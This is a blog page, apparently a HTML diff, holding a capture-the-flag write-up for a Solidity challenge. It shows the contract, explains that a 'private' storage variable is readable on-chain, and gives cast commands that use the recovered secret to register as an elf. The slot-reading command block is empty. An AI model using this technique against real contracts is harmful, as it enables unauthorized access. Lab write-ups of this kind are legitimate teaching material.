@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/shr3k/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=shr3k/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Xmas List3 | Root Xmas CTF 2025 | le blog</title>
+<meta name="keywords" content="web3">
+<meta name="description" content="Introduction
+
+     
+
+
+Last year, Santa noticed that some mischievous elves had been diverting gifts!
+This year, he decided to secure his entire supply chain using blockchain technology.
+But since Santa isn’t exactly comfortable with this new system, the developer gave him a special key that lets him hand over the distribution process &ldquo;safely&rdquo;&hellip;
+We have presented a little website with this info
+|Your private key  |   0x6715d324d14e0565ab02a575fa5f74540719ba065a610cba6497cdbf22cd5cdb|
+|Your address   |  0xCaffE305b3Cc9A39028393D3F338f2a70966Cb85|
+|Challenge&rsquo;s address  |   0xA79e1213be40bff69dF39Fd1Fd50555e80aB1B40|
+|RPC URL  |   http://dyn-01.xmas.root-me.org:13021/rpc|
+|Chain ID  |   1337|
+|Flag |Whatever|">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/shr3k/writeups/ctf-xmas-dos/">
+<link crossorigin="anonymous" href="/shr3k/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/shr3k/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/shr3k/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/shr3k/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/shr3k/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/shr3k/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/shr3k/writeups/ctf-xmas-dos/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/shr3k/" accesskey="h" title="le blog (Alt + H)">le blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/shr3k/archives/" title="Archive">
+                    <span>Archive</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/shr3k/" title="home">
+                    <span>home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/shr3k/writeups" title="writeups">
+                    <span>writeups</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Xmas List3 | Root Xmas CTF 2025
+      <span class="entry-hint" title="Draft">
+        <svg xmlns="http://www.w3.org/2000/svg" height="35" viewBox="0 -960 960 960" fill="currentColor">
+          <path
+            d="M160-410v-60h300v60H160Zm0-165v-60h470v60H160Zm0-165v-60h470v60H160Zm360 580v-123l221-220q9-9 20-13t22-4q12 0 23 4.5t20 13.5l37 37q9 9 13 20t4 22q0 11-4.5 22.5T862.09-380L643-160H520Zm300-263-37-37 37 37ZM580-220h38l121-122-18-19-19-18-122 121v38Zm141-141-19-18 37 37-18-19Z" />
+        </svg>
+      </span>
+    </h1>
+    <div class="post-meta"><span title='2025-12-11 16:14:57 +0100 CET'>December 11, 2025</span>&nbsp;·&nbsp;<span>4 min</span>&nbsp;·&nbsp;<span>850 words</span>
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#the-vulnerability">The vulnerability</a></li>
+    <li><a href="#exploiting-the-vulnerability">Exploiting the vulnerability</a>
+      <ul>
+        <li><a href="#step-1-read-the-magicxmass3cre3t">Step 1: Read the magicXmasS3cre3t</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h2>
+<figure>
+    <img loading="lazy" src="/shr3k/image/key-magic-key.gif"/> 
+</figure>
+
+<p>Last year, Santa noticed that some mischievous elves had been diverting gifts!</p>
+<p>This year, he decided to secure his entire supply chain using blockchain technology.</p>
+<p>But since Santa isn’t exactly comfortable with this new system, the developer gave him a special key that lets him hand over the distribution process &ldquo;safely&rdquo;&hellip;</p>
+<p>We have presented a little website with this info</p>
+<p>|Your private key  |   0x6715d324d14e0565ab02a575fa5f74540719ba065a610cba6497cdbf22cd5cdb|
+|Your address   |  0xCaffE305b3Cc9A39028393D3F338f2a70966Cb85|
+|Challenge&rsquo;s address  |   0xA79e1213be40bff69dF39Fd1Fd50555e80aB1B40|
+|RPC URL  |   <a href="http://dyn-01.xmas.root-me.org:13021/rpc">http://dyn-01.xmas.root-me.org:13021/rpc</a>|
+|Chain ID  |   1337|
+|Flag |Whatever|</p>
+<p>And a Challenge.sol file wich [&hellip;]</p>
+<pre tabindex="0"><code>// SPDX-License-Identifier: GPL-3.0
+pragma solidity &gt;=0.8.20;
+
+contract RM_Xmas_List3 {
+    address public santaClaus;
+
+    struct Elf {
+        string name;
+        uint256 level;
+        address account;
+    }
+
+    struct Gift {
+        string description;
+        uint256 elfId; 
+        uint256 childId;
+        address childFor;
+        bool delivered;
+    }
+
+    struct Child {
+        string name;
+        address reservedFor;
+        bool delivered;
+    }
+
+    Elf[] public elves;
+    Gift[] public gifts;
+    Child[] public children;
+
+    mapping(address =&gt; uint256) public elvesId;
+    mapping(address =&gt; uint256) public childId;
+    mapping(address =&gt; uint256) public childNonce;
+
+    bytes32 private magicXmasS3cr3t; 
+
+    modifier onlySanta() {
+        require(msg.sender == santaClaus, &#34;Only Santa can access this function&#34;);
+        _;
+    }
+
+    modifier onlyElf() {
+        require(elvesId[msg.sender] &gt; 0, &#34;Only Elf&#34;);
+        _;
+    }
+
+    constructor(bytes32 _magicXmasS3cr3t) {
+        santaClaus = msg.sender;
+        magicXmasS3cr3t = keccak256(abi.encodePacked(_magicXmasS3cr3t, santaClaus));
+    }
+
+    function registerElf(string calldata _name, uint256 _level, address _account) external onlySanta returns (uint256 id) {
+        require(_account != address(0), &#34;zero address&#34;);
+        require(elvesId[_account] == 0, &#34;already elf&#34;);
+
+        id = elves.length;
+        elves.push(Elf({name: _name, level: _level, account: _account}));
+        elvesId[_account] = id + 1;
+    }
+
+    function registerChild(string calldata _name) external returns (uint256 id) {
+        require(childId[msg.sender] == 0, &#34;already registered&#34;);
+        id = children.length;
+        children.push(Child({name: _name, reservedFor: msg.sender, delivered: false}));
+        childId[msg.sender] = id + 1;
+    }
+
+    function prepareGift(string calldata _description, uint256 _childId) external onlyElf returns (uint256 giftId) {
+        require(_childId &lt; children.length, &#34;Invalid child&#34;);
+
+        Gift memory gift = Gift({
+            description: _description,
+            elfId: elvesId[msg.sender],
+            childId: _childId,
+            childFor: children[_childId].reservedFor,
+            delivered: false
+        });
+
+        giftId = gifts.length;
+        gifts.push(gift);
+    }
+
+    function deliverGift(uint256 _giftId) external onlyElf {
+        require(_giftId &lt; gifts.length, &#34;Invalid gift&#34;);
+        Gift storage g = gifts[_giftId];
+        require(!g.delivered, &#34;Already delivered&#34;);
+        g.delivered = true;
+        children[g.childId].delivered = true;
+    }
+
+    function getElvesCount() external view returns (uint256) {
+        return elves.length;
+    }
+
+    function claimElfBySecret(string calldata _name, bytes32 _guess) external {
+        require(_guess == magicXmasS3cr3t, &#34;Bad magic Xmas Secret Word&#34;);
+        uint256 id = elves.length;
+        elves.push(Elf({name: _name, level: 1, account: msg.sender}));
+        elvesId[msg.sender] = id + 1;
+    }
+    
+    function getGiftInfo(uint256 _giftId) external view returns (
+            string memory description,
+            uint256 elfId,
+            string memory childName,
+            address childFor,
+            bool delivered
+        )
+    {
+        require(_giftId &lt; gifts.length, &#34;Invalid gift&#34;);
+        Gift storage g = gifts[_giftId];
+        description = g.description;
+        elfId = g.elfId;
+        childName = children[g.childId].name;
+        childFor = g.childFor;
+        delivered = g.delivered;
+    }
+    
+    function getChildInfo(uint256 _id) external view returns (
+            string memory name,
+            address reservedFor,
+            bool delivered
+        )
+    {
+        require(_id &lt; children.length, &#34;Invalid Child ID&#34;);
+        Child storage c = children[_id];
+        name = c.name;
+        reservedFor = c.reservedFor;
+        delivered = c.delivered;
+    }
+
+    function getElfInfo(uint256 _id) external view returns (
+            string memory name,
+            uint256 level,
+            address account
+        )
+    {
+        require(_id &lt; elves.length, &#34;Invalid elf ID&#34;);
+        Elf storage a = elves[_id];
+        name = a.name;
+        level = a.level;
+        account = a.account;
+    }
+
+    function isSolved() external view returns (bool) {
+        return elvesId[msg.sender] &gt; 0;
+    }
+}
+</code></pre><p>The <code>isSolved()</code> function relies on the sender&rsquo;s address being registered in the elvesId mapping:
+Solidity</p>
+<pre tabindex="0"><code>function isSolved() external view returns (bool) {
+    return elvesId[msg.sender] &gt; 0;
+}
+</code></pre><p>There are two functions to become an Elf:</p>
+<p><code>registerElf(...):</code> Protected by onlySanta. Requires the deployer&rsquo;s key, which we do not have.</p>
+<p><code>claimElfBySecret(string calldata _name, bytes32 _guess):</code> Allows any user to register as an Elf if they can provide the correct _guess, which must match the contract&rsquo;s secret: magicXmasS3cr3t.</p>
+<p>The exploit path is clear: We must find the value of the magicXmasS3cr3t variable.</p>
+<h2 id="the-vulnerability">The vulnerability<a hidden class="anchor" aria-hidden="true" href="#the-vulnerability">#</a></h2>
+<p><code>bytes32 private magicXmasS3cr3t;</code></p>
+<p>Private doesnt prevent external clients from reading the raw blockchain chain storage. Ethereum state is publicly visible.</p>
+<p>The variable is initialized in the constructor:</p>
+<pre tabindex="0"><code>constructor(bytes32 _magicXmasS3cr3t) {
+    santaClaus = msg.sender;
+    magicXmasS3cr3t = keccak256(abi.encodePacked(_magicXmasS3cr3t, santaClaus));
+}
+</code></pre><table>
+  <thead>
+      <tr>
+          <th>Slot</th>
+          <th>Index</th>
+          <th>Variable</th>
+          <th>Type</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>0</td>
+          <td>santaClaus</td>
+          <td>address</td>
+          <td>public</td>
+      </tr>
+      <tr>
+          <td>1</td>
+          <td>elves</td>
+          <td>Elf[            ]</td>
+          <td>public</td>
+      </tr>
+      <tr>
+          <td>2</td>
+          <td>gifts</td>
+          <td>Gift[          ]</td>
+          <td>public</td>
+      </tr>
+      <tr>
+          <td>3</td>
+          <td>children</td>
+          <td>Child[]</td>
+          <td>public</td>
+      </tr>
+      <tr>
+          <td>4</td>
+          <td>elvesId</td>
+          <td>mapping</td>
+          <td>(&hellip;)</td>
+      </tr>
+      <tr>
+          <td>5</td>
+          <td>childId</td>
+          <td>mapping</td>
+          <td>(&hellip;)</td>
+      </tr>
+      <tr>
+          <td>6</td>
+          <td>childNonce</td>
+          <td>mapping</td>
+          <td>(&hellip;)</td>
+      </tr>
+      <tr>
+          <td>7</td>
+          <td>magicXmasSecr3t</td>
+          <td>bytes32</td>
+          <td>private</td>
+      </tr>
+  </tbody>
+</table>
+<p>The target variable is located in storage slot <code>7</code>.</p>
+<h2 id="exploiting-the-vulnerability">Exploiting the vulnerability<a hidden class="anchor" aria-hidden="true" href="#exploiting-the-vulnerability">#</a></h2>
+<p>We can use the <code>cast</code> tool from the <a href="https://foundryup.com">foundry</a> framework to interact with the RPC endpoint.</p>
+<table>
+  <thead>
+      <tr>
+          <th>RPC</th>
+          <th>URL</th>
+          <th><a href="http://dyn-01.xmas.root-me.org:13021/rpc">http://dyn-01.xmas.root-me.org:13021/rpc</a></th>
+          <th></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Contract</td>
+          <td>Adress</td>
+          <td>0xA79e1213be40bff69dF39Fd1Fd50555e80aB1B40</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>Attacker</td>
+          <td>Private key</td>
+          <td>0x6715d324d14e0565ab02a575fa5f74540719ba065a610cba6497cdbf22cd5cdb</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>Attacker</td>
+          <td>Adress</td>
+          <td>0xCaffE305b3Cc9A39028393D3F338f2a70966Cb85</td>
+          <td></td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="step-1-read-the-magicxmass3cre3t">Step 1: Read the magicXmasS3cre3t<a hidden class="anchor" aria-hidden="true" href="#step-1-read-the-magicxmass3cre3t">#</a></h3>
+<p>We can use the cast storage to query the content of slot 7 at the challenge contracty address.</p>
+<p>Lets set some environment variables</p>
+<pre tabindex="0"><code>export RPC_URL=&#34;http://dyn-01.xmas.root-me.org:13021/rpc&#34;
+export CONTRACT_ADDRESS=&#34;0xA79e1213be40bff69dF39Fd1Fd50555e80aB1B40&#34;
+export PRIVATE_KEY=&#34;0x6715d324d14e0565ab02a575fa5f74540719ba065a610cba6497cdbf22cd5cdb&#34;
+export ACCOUNT_ADDRESS=&#34;0xCaffE305b3Cc9A39028393D3F338f2a70966Cb85&#34;
+</code></pre><p>Then we can read the secret from storage slot 7</p>
+<pre tabindex="0"><code></code></pre><p>We can now retrieve the $MAGIC_SECRET to call claimElfBySecret vi a transaction signed with our private key.</p>
+<pre tabindex="0"><code>shr3k@shr3k:~$ cast send $CONTRACT_ADDRESS \
+&#34;claimElfBySecret(string,bytes32)&#34; \
+&#34;YourElfName2&#34; \
+$MAGIC_SECRET \
+--private-key $PRIVATE_KEY \
+--rpc-url $RPC_URL \
+--from $ACCOUNT_ADDRESS
+
+blockHash            0xfd8fdb905f205f093d49fd77c33a83a01bdcdb3ebd907c84601255bcc98c169d
+blockNumber          4
+contractAddress
+cumulativeGasUsed    119829
+effectiveGasPrice    684231441
+from                 0xCaffE305b3Cc9A39028393D3F338f2a70966Cb85
+gasUsed              119829
+logs                 []
+logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+root
+status               1 (success)
+transactionHash      0xa7e0d8ee34224bc95c3cb3283cf6abf13a14361791028f6f3028bf40a595b0af
+transactionIndex     0
+type                 2
+blobGasPrice         1
+blobGasUsed
+to                   0xA79e1213be40bff69dF39Fd1Fd50555e80aB1B40
+</code></pre><p>We can now verify the transaction by going on the website, when we click <strong>Claim the flag</strong>
+we obtain :
+Flag     RM{N0_S3cr3t_C4n_B3_H1dd3n_0n_Ch41n}</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/shr3k/tags/web3/">Web3</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/shr3k/">le blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
